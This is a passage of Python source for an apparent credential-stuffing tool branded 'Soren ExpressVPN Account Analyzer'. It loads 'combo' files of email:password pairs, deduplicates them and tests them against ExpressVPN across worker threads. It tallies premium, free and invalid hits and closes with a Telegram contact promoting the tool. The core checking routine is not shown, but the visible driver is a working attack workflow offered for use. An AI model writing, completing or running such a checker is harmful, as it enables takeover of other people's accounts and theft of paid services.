    table = Table(title=f"[bold {SAND}]SELECT AN EXPRESSVPN ACCOUNT FILE[/]", box=box.SIMPLE, border_style=CLAY, width=80)
    table.add_column("NO.", style=CLAY, justify="right")
    table.add_column("FILENAME", style="white")
    table.add_column("SIZE", style=SAND)
    table.add_column("LINES", style="magenta")
    for i, (path, size, count) in enumerate(file_details, 1):
        name = os.path.basename(path)
        if len(name) > 40:
            name = name[:37] + '...'
        size_str = format_size(size)
        count_str = f"{count:,}"
        table.add_row(f"[ {i} ]", name, size_str, count_str)
    console.print(Align.center(table))
    return [item[0] for item in file_details]

def preview_file_lines(file_path, num_lines=5):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [f.readline().strip() for _ in range(num_lines) if f]
        return lines
    except:
        return []

def select_input_file():
    while True:
        available_files = find_and_list_account_files()
        if available_files:
            choice = Prompt.ask(f"[{SAND}]➤ SELECT COMBO FILE[/{SAND}]", choices=[str(i) for i in range(1, len(available_files)+1)], default="1")
            file_choice = int(choice) - 1
            if 0 <= file_choice < len(available_files):
                selected_file_path = available_files[file_choice]
                preview = preview_file_lines(selected_file_path, 5)
                if preview:
                    preview_text = "\n".join([f"   [dim]{line[:80]}{'...' if len(line)>80 else ''}[/dim]" for line in preview if line])
                    console.print(Align.center(Panel(preview_text, title=f"[bold {SAND}]FILE PREVIEW (first 5 lines)[/]", border_style=CLAY, width=80)))
                return selected_file_path
            else:
                console.print(f"  [red]Invalid number.[/]")
        else:
            show_no_combo_panel()

def prompt_for_duplicate_removal(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        original_count = len(lines)
        unique_lines = list(dict.fromkeys([line for line in lines if line.strip()]))
        duplicates_removed = original_count - len(unique_lines)
        if duplicates_removed > 0:
            console.print(f"  [green]✓ Removed {duplicates_removed} duplicate line(s).[/]")
        else:
            console.print(f"  [green]✓ No duplicates were found.[/]")
    except Exception as e:
        console.print(f"  [red]Error during duplicate removal: {e}[/]")

def run_checker():
    rate_limit.check_and_wait()

    display_banner()
    filename = select_input_file()
    if not filename or not os.path.exists(filename):
        console.print(f"   [red]File not found.[/]")
        return

    dup_choice = Prompt.ask(f"[{SAND}]Remove duplicate lines?[/{SAND}]", choices=["y", "n"], default="n")
    if dup_choice == "y":
        prompt_for_duplicate_removal(filename)

    accounts = []
    for encoding in ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']:
        try:
            with open(filename, 'r', encoding=encoding) as f:
                accounts = [line.strip() for line in f if line.strip() and not line.startswith('===')]
            break
        except:
            continue

    if not accounts:
        console.print(f"   [red]No valid accounts found[/]")
        return

    checker = ExpressVPNChecker()
    total = len(accounts)
    stats = {'checked': 0, 'total': total, 'premium': 0, 'free': 0, 'invalid': 0, 'retries': 0}
    stats_lock = Lock()
    start_time = datetime.now()
    last_update = 0

    precheck_panel = Panel(
        f"[bold {SAND}]📊 PRE-CHECK INFO[/bold {SAND}]\n\n"
        f"[white]Total Accounts:[/white] [yellow]{total}[/yellow]\n"
        f"[white]Proxy:[/white] [green]Disabled[/green]\n"
        f"[white]Rate Limit:[/white] [green]500 per 15 min[/green]",
        border_style=CLAY, box=box.ROUNDED, padding=(0, 1), width=50
    )
    console.print(Align.center(precheck_panel))
    console.print()
    console.print(f"\n[cyan]🚀 Starting ExpressVPN check...[/cyan]\n")
    console.print("\n" * 5)

    output_lock = Lock()
    def output(msg):
        with output_lock:
            console.print(Align.center(Panel(msg, border_style=CLAY, box=box.SIMPLE, padding=(0, 0), width=80)))

    def worker(combo):
        if ':' not in combo:
            with stats_lock:
                stats['checked'] += 1
                stats['invalid'] += 1
            return
        email, password = combo.split(':', 1)
        email = email.strip()
        password = password.strip()
        checker.check_account(email, password, output)
        with stats_lock:
            stats['checked'] += 1
            stats['premium'] = checker.hits_premium
            stats['free'] = checker.hits_free
            stats['invalid'] = checker.invalid
            stats['retries'] = checker.retries
        rate_limit.record()
        time.sleep(1)

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(worker, acc) for acc in accounts]
        for future in as_completed(futures):
            if shutdown_event.is_set():
                executor.shutdown(wait=False, cancel_futures=True)
                break
            with stats_lock:
                if stats['checked'] - last_update >= 10:
                    console.print(Align.center(build_live_stats_ui(stats)))
                    last_update = stats['checked']

    end_time = datetime.now()
    console.print()
    console.print(Align.center(Text("=" * 60, style="white")))
    console.print(Align.center(Text("CHECKING COMPLETE", style="bold green")))
    console.print(Align.center(Text("=" * 60, style="white")))
    console.print()
    display_aesthetic_summary(stats, start_time, end_time)

    console.print()
    console.print(Align.center(Text("══════════════════════════════════════════", style=CLAY)))
    console.print(Align.center(Text("THANK YOU FOR USING", style="bold white")))
    console.print(Align.center(Text("SOREN EXPRESSVPN", style="bold white")))
    console.print(Align.center(Text("ACCOUNT ANALYZER", style="bold white")))
    console.print(Align.center(Text("══════════════════════════════════════════", style=CLAY)))
    console.print()
    console.print(Align.center(Text("📱 Telegram: @sorensys", style="white")))
    console.print(Align.center(Text("🔗 Channel: https://t.me/sorensync", style="white")))
    console.print()
    console.print(Align.center(Text("══════════════════════════════════════════", style=CLAY)))
    console.input(f"[{SAND}]Press Enter to exit...[/{SAND}]")

if __name__ == "__main__":
    try:
        run_checker()
    except KeyboardInterrupt:
        console.print("\n[bold red]⚠ INTERRUPTED BY USER - Shutting down...[/]")
        sys.exit(0)